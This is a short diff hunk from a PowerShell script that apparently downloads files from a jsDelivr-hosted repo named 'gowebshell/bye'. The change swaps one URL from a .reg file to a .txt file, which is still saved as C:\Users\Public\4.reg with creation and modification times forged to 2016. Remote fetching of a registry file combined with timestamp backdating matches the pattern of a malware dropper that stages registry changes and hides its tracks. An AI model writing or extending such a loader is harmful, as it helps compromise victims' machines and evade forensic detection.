@@ -24,7 +24,7 @@ $fileList = @(
         ModificationTime = Get-Date "2016-07-18 14:45:00"
     },
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/baidu/exe/4.reg"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/bye/baidu/exe/4.txt"
         OutputPath = "C:\Users\Public\4.reg"
         CreationTime = Get-Date "2016-07-18 14:45:00"
         ModificationTime = Get-Date "2016-07-18 14:45:00"
